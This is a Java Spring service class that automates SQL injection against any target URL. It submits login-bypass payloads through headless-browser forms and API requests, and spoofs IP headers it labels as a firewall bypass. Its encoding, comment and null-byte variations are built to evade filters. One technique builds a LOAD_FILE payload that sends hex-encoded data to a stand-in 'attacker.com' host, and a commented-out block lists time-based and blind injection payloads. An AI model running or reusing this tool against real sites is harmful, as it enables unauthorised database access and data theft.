package com.web.webservices;

import org.springframework.stereotype.Service;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.*;
import java.util.stream.Collectors;
import org.openqa.selenium.*;
import org.openqa.selenium.NoSuchElementException;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.firefox.FirefoxOptions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import io.github.bonigarcia.wdm.WebDriverManager;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.web.servicesinterfers.SQLINJECTIONATTACKING;
import com.web.webDTO.SQLinjectionDTO;
import static java.util.Map.entry;

@Service
public class SQLINJECTIONservices implements SQLINJECTIONATTACKING {

  
    // method to bypass firewall
    private static final Map<String, String> WAF_BYPASS_HEADERS = Map.ofEntries(
        entry("X-Forwarded-For", "127.0.0.1"),
        entry("X-Originating-IP", "127.0.0.1"),
        entry("X-Remote-IP", "127.0.0.1"),
        entry("X-Remote-Addr", "127.0.0.1"),
        entry("X-Client-IP", "127.0.0.1"),
        entry("X-Host", "127.0.0.1"),
        entry("X-Forwared-Host", "127.0.0.1"),
        entry("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"),
        entry("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"),
        entry("Accept-Language", "en-US,en;q=0.5"),
        entry("Accept-Encoding", "gzip, deflate, br"),
        entry("Upgrade-Insecure-Requests", "1"),
        entry("Cache-Control", "max-age=0")
    );

    private final ObjectMapper objectMapper = new ObjectMapper();

    @Override
    public List<String> runTest(SQLinjectionDTO request) {
        List<String> payloads = generateAdvancedSqliPayloads();
        List<String> results = new ArrayList<>();

        if (request.getFormType() == null) {
            results.add("[✖] Form type is required");
            return results;
        }

        for (String payload : payloads) {
            String result;
            try {
                if ("api".equalsIgnoreCase(request.getFormType()) || "restapi".equalsIgnoreCase(request.getFormType())) {
                    if (request.getPayload() == null || request.getPayload().isEmpty()) {
                        result = "[✖] Payload is required for API testing";
                    } else if (request.getHttpMethod() == null || request.getHttpMethod().isEmpty()) {
                        result = "[✖] HTTP method is required for API testing";
                    } else {
                        result = tryAllBypassTechniques(request, payload);
                    }
                } else {
                    result = submitForm(request.getTargetUrl(), payload, request.getFormType(), request.getPayload());
                }
                results.add(result);
            } catch (Exception e) {
                results.add("[✖] Failed with payload: " + payload + " | Error: "
                        + (e.getClass() != null ? e.getClass().getSimpleName() : "UnknownError") + ": "
                        + (e.getMessage() != null ? e.getMessage() : "No error message"));
            }
        }

        return results;
    }

    private String submitForm(String url, String payload, String formType, Map<String, Object> formData) {
        WebDriverManager.firefoxdriver().setup();
        FirefoxOptions options = new FirefoxOptions();
        options.setBinary("/usr/bin/firefox");
        System.setProperty("webdriver.gecko.driver", "/usr/bin/geckodriver");
        options.addArguments("--headless");
        WebDriver driver = new FirefoxDriver(options);

        try {
            driver.get(url);
            WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));

            if (formData != null && !formData.isEmpty()) {
                // Dynamic form handling
                boolean firstField = true;
                for (Map.Entry<String, Object> entry : formData.entrySet()) {
                    try {
                        WebElement field = wait.until(ExpectedConditions.presenceOfElementLocated(
                            By.xpath(String.format("//*[@name='%s' or @id='%s']", entry.getKey(), entry.getKey()))
                        ));
                        field.clear();
                        
                        if (firstField) {
                            field.sendKeys(payload); // Inject payload in first field
                            firstField = false;
                        } else {
                            String value = (entry.getValue() != null) ? 
                                entry.getValue().toString() : 
                                getDefaultValueForField(entry.getKey());
                            field.sendKeys(value);
                        }
                    } catch (NoSuchElementException e) {
                        continue; // Skip if field not found
                    }
                }

                // Try to submit the form
                try {
                    driver.findElement(By.xpath("//*[@type='submit']")).click();
                } catch (Exception e) {
                    // Fallback to submitting last field
                    String lastField = formData.keySet().stream().reduce((first, second) -> second).orElse("");
                    if (!lastField.isEmpty()) {
                        driver.findElement(By.name(lastField)).submit();
                    }
                }
            } else {
                // Fallback to original behavior
                handleDefaultFormTypes(driver, wait, formType, payload);
            }

            return checkFormSubmissionResult(driver, payload);
        } catch (Exception e) {
            return "[✖] Failed with payload: " + payload + " | Error: " + e.getClass().getSimpleName() + ": " + e.getMessage();
        } finally {
            driver.quit();
        }
    }

    private void handleDefaultFormTypes(WebDriver driver, WebDriverWait wait, String formType, String payload) throws Exception {
        switch (formType.toLowerCase()) {
            case "login":
                WebElement userField = wait.until(ExpectedConditions.presenceOfElementLocated(By.name("username")));
                WebElement passField = wait.until(ExpectedConditions.presenceOfElementLocated(By.name("password")));
                userField.sendKeys(payload);
                passField.sendKeys("password");
                passField.submit();
                break;
            case "register":
                WebElement regUser = wait.until(ExpectedConditions.presenceOfElementLocated(By.name("username")));
                WebElement regEmail = wait.until(ExpectedConditions.presenceOfElementLocated(By.name("email")));
                WebElement regPass = wait.until(ExpectedConditions.presenceOfElementLocated(By.name("password")));
                regUser.sendKeys(payload);
                regEmail.sendKeys("test@example.com");
                regPass.sendKeys("password");
                regPass.submit();
                break;
            case "comment":
                WebElement commentField = wait.until(ExpectedConditions.presenceOfElementLocated(By.name("comment")));
                commentField.sendKeys(payload);
                commentField.submit();
                break;
            default:
                throw new Exception("Unsupported form type: " + formType);
        }
    }

    private String checkFormSubmissionResult(WebDriver driver, String payload) {
        try {
            WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(5));
            wait.until(ExpectedConditions.or(
                ExpectedConditions.presenceOfElementLocated(By.className("dashboard")),
                ExpectedConditions.presenceOfElementLocated(By.className("error")),
                ExpectedConditions.presenceOfElementLocated(By.tagName("h1")),
                ExpectedConditions.urlContains("success")
            ));

            if (driver.findElements(By.className("dashboard")).size() > 0 || 
                driver.getCurrentUrl().contains("success")) {
                return "[✔] Success with payload: " + payload;
            } else if (driver.findElements(By.className("error")).size() > 0) {
                return "[⚠] Form submitted but returned error with payload: " + payload;
            } else {
                return "[⚠] Form submitted but result unclear with payload: " + payload;
            }
        } catch (TimeoutException e) {
            return "[⚠] Form submission timeout with payload: " + payload;
        }
    }

    private String submitToApiWithBypass(String url, String payload, Map<String, Object> originalPayload, 
                                       String httpMethod, String technique) {
        try {
            HttpClient client = HttpClient.newHttpClient();
            HttpRequest.Builder builder = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .timeout(Duration.ofSeconds(15));

            WAF_BYPASS_HEADERS.forEach((key, value) -> {
                if (!isRestrictedHeader(key)) {
                    builder.header(key, value);
                }
            });

            if ("chunked_transfer".equals(technique)) {
                builder.header("Transfer-Encoding", "chunked");
            }

            String requestBody;
            String contentType;
            
            if ("JSON".equalsIgnoreCase(httpMethod)) {
                Map<String, Object> injectedPayload = new HashMap<>(originalPayload);
                if (!injectedPayload.isEmpty()) {
                    String firstField = injectedPayload.keySet().iterator().next();
                    injectedPayload.put(firstField, payload);
                }
                requestBody = objectMapper.writeValueAsString(injectedPayload);
                contentType = "application/json";
            } else {
                String fieldName = originalPayload.keySet().iterator().next();
                requestBody = fieldName + "=" + URLEncoder.encode(payload, StandardCharsets.UTF_8);
                contentType = "application/x-www-form-urlencoded";
            }

            builder.header("Content-Type", contentType);

            switch (httpMethod.toUpperCase()) {
                case "GET":
                    String fieldName = originalPayload.keySet().iterator().next();
                    String query = url.contains("?") ? "&" : "?";
                    query += fieldName + "=" + URLEncoder.encode(payload, StandardCharsets.UTF_8);
                    builder.uri(URI.create(url + query)).GET();
                    break;
                case "POST":
                    builder.POST(BodyPublishers.ofString(requestBody));
                    break;
                case "PUT":
                    builder.PUT(BodyPublishers.ofString(requestBody));
                    break;
                default:
                    return "[✖] Unsupported HTTP method: " + httpMethod;
            }

            HttpRequest request = builder.build();
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            return analyzeResponse(response, payload);
        } catch (Exception e) {
            return "[✖] API Error for payload: " + payload + " | Exception: " + 
                   e.getClass().getSimpleName() + ": " + e.getMessage();
        }
    }

    private String analyzeResponse(HttpResponse<String> response, String payload) {
        int statusCode = response.statusCode();
        String body = response.body().toLowerCase();

        List<String> sqlErrorPatterns = Arrays.asList(
            "sql", "syntax", "exception", "error", "mysql", "ora-", "warning", 
            "unclosed", "quoted", "string", "unterminated", "driver", "odbc",
            "jdbc", "pdo", "postgresql", "microsoft ole db", "syntax error"
        );

        boolean isSqlError = sqlErrorPatterns.stream().anyMatch(body::contains);

        if (statusCode == 200 && (body.contains("success") || body.contains("welcome"))) {
            return "[✖] Payload executed but endpoint returned success: " + payload;
        } else if (statusCode == 500 || isSqlError) {
            return "[✔] Possible SQLi detected with payload: " + payload + 
                   " | Status: " + statusCode + " | Response: " + 
                   (response.body().length() > 100 ? response.body().substring(0, 100) + "..." : response.body());
        } else if (statusCode >= 400) {
            return "[⚠] Unexpected API behavior with payload: " + payload + 
                   " | Status: " + statusCode;
        } else {
            return "[✖] No SQLi indicators for payload: " + payload + 
                   " | Status: " + statusCode + " | Response: " + 
                   (response.body().length() > 100 ? response.body().substring(0, 100) + "..." : response.body());
        }
    }

    private String tryAllBypassTechniques(SQLinjectionDTO request, String originalPayload) {
        List<String> techniques = Arrays.asList(
            "standard",
            "url_encoded",
            "double_url_encoded",
            "unicode",
            "html_encoded",
            "base64_wrapped",
            "comment_obfuscated",
            "case_variation",
            "null_bytes",
            "chunked_transfer"
        );

        StringBuilder results = new StringBuilder();
        
        for (String technique : techniques) {
            String modifiedPayload = applyBypassTechnique(originalPayload, technique);
            String result = submitToApiWithBypass(
                request.getTargetUrl(), 
                modifiedPayload, 
                request.getPayload(),
                request.getHttpMethod(),
                technique
            );
            results.append("\n[").append(technique.toUpperCase()).append("] ").append(result);
        }
        
        return results.toString();
    }

    private String applyBypassTechnique(String payload, String technique) {
        switch (technique.toLowerCase()) {
            case "url_encoded":
                return URLEncoder.encode(payload, StandardCharsets.UTF_8);
            case "double_url_encoded":
                return URLEncoder.encode(URLEncoder.encode(payload, StandardCharsets.UTF_8), StandardCharsets.UTF_8);
            case "unicode":
                return convertToUnicode(payload);
            case "html_encoded":
                return htmlEncode(payload);
            case "base64_wrapped":
                return "1' AND 1=1 UNION ALL SELECT 1,2,3,LOAD_FILE(CONCAT('\\\\', (" +
                       "SELECT HEX(" + base64Encode(payload) + ") " +
                       "), '.attacker.com\\share'))-- -";
            case "comment_obfuscated":
                return obfuscateWithComments(payload);
            case "case_variation":
                return varyCase(payload);
            case "null_bytes":
                return addNullBytes(payload);
            default:
                return payload;
        }
    }

    private List<String> generateAdvancedSqliPayloads() {
        List<String> basePayloads = Arrays.asList(
            "' OR 1=1--", "' OR 1=1-- -", "' OR 1=1#", 
            "' OR '1'='1'--", "' OR '1'='1'-- -", "' OR '1'='1'#",
            "\" OR 1=1--", "\" OR 1=1-- -", "\" OR 1=1#",
            "') OR 1=1--", "') OR 1=1-- -", "') OR 1=1#",
            "'; OR 1=1--", "'; OR 1=1-- -", "'; OR 1=1#"
            
           // "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            //"' OR (SELECT * FROM (SELECT(SLEEP(5)))a)#",
            //"\" OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            //"') OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            //"');WAITFOR DELAY '0:0:5'--",
            
            //"' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",
            //"' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')=1--",
            
            //"' /*!50000OR*/ 1=1--",
            //"' /*!OR*/ 1=1--",
            //"'/**/OR/**/1=1--",
            //"'%0AOR%0A1=1--",
            //"'%09OR%091=1--",
            //"'%0BOR%0B1=1--",
            //"'%0COR%0C1=1--",
            //"'%0DOR%0D1=1--",
            //"'%20OR%201=1--",
            
            //"' OR 1=1 /*", 
            //"' OR 1=1 -- -",
            //"' OR 1=1 #",
            //"' OR 1=1%00",
            
            //"' || '1'='1", 
            //"'+(SELECT '1')+'", 
            //"' || (SELECT '1') || '",
            
            //"\\\" OR 1=1--", 
            //"\\\" || '1'='1", 
            //"\\\"}'); WAITFOR DELAY '0:0:5'--",
            
       //     "'%EF%BC%87%20%4F%52%20%31%3D%31%2D%2D",
         //   "'%2527%2520%254F%2552%2520%2531%253D%2531%252D%252D",
           // "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
           // "' AND 1=1--sp_password",
            //"' EXEC sp_executesql N'SELECT 1'--",
            //"'%20%68%61%76%69%6E%67%20%31%3D%31%2D%2D"
        );
           
        List<String> allPayloads = new ArrayList<>();
        for (String payload : basePayloads) {
            allPayloads.addAll(generatePayloadVariations(payload));
        }
        
        return allPayloads.stream().distinct().collect(Collectors.toList());
    }

    private List<String> generatePayloadVariations(String basePayload) {
        List<String> variations = new ArrayList<>();
        
        variations.add(basePayload);
        variations.add(basePayload.toLowerCase());
        variations.add(basePayload.toUpperCase());
        variations.add(varyCase(basePayload));
        
        variations.add(URLEncoder.encode(basePayload, StandardCharsets.UTF_8));
        variations.add(convertToUnicode(basePayload));
        variations.add(htmlEncode(basePayload));
        variations.add(base64Encode(basePayload));
        
        variations.add(obfuscateWithComments(basePayload));
        variations.add(addNullBytes(basePayload));
        variations.add(addRandomWhitespace(basePayload));
        
        return variations;
    }

    private String convertToUnicode(String input) {
        StringBuilder sb = new StringBuilder();
        for (char c : input.toCharArray()) {
            sb.append("\\u").append(String.format("%04x", (int) c));
        }
        return sb.toString();
    }

    private String htmlEncode(String input) {
        return input.replace("'", "&#39;")
                   .replace("\"", "&quot;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;")
                   .replace("&", "&amp;");
    }

    private String base64Encode(String input) {
        return Base64.getEncoder().encodeToString(input.getBytes());
    }

    private String obfuscateWithComments(String input) {
        return input.replace(" ", "/**/")
                   .replace("OR", "/*!OR*/")
                   .replace("AND", "/*!AND*/")
                   .replace("SELECT", "/*!SELECT*/")
                   .replace("FROM", "/*!FROM*/");
    }
    
    private String varyCase(String input) {
        StringBuilder sb = new StringBuilder();
        boolean upper = false;
        for (char c : input.toCharArray()) {
            sb.append(upper ? Character.toUpperCase(c) : Character.toLowerCase(c));
            upper = !upper;
        }
        return sb.toString();
    }

    private String addNullBytes(String input) {
        return input.replace(" ", "\0 ")
                    .replace("--", "\0--")
                    .replace("#", "\0#");
    }

    private String addRandomWhitespace(String input) {
        return input.replace(" ", "  ")
                   .replace("=", " = ")
                   .replace(",", " , ")
                   .replace("(", " ( ")
                   .replace(")", " ) ");
    }

    private String getDefaultValueForField(String fieldName) {
        switch (fieldName.toLowerCase()) {
            case "username":
            case "user":
            case "login":
                return "testuser";
            case "password":
            case "pass":
                return "password";
            case "email":
                return "test@example.com";
            case "comment":
                return "test comment";
            default:
                return "test";
        }
    }

    private boolean isRestrictedHeader(String headerName) {
        Set<String> restrictedHeaders = Set.of(
            "connection", "content-length", "expect", "host", "upgrade"
        );
        return restrictedHeaders.contains(headerName.toLowerCase());
    }


}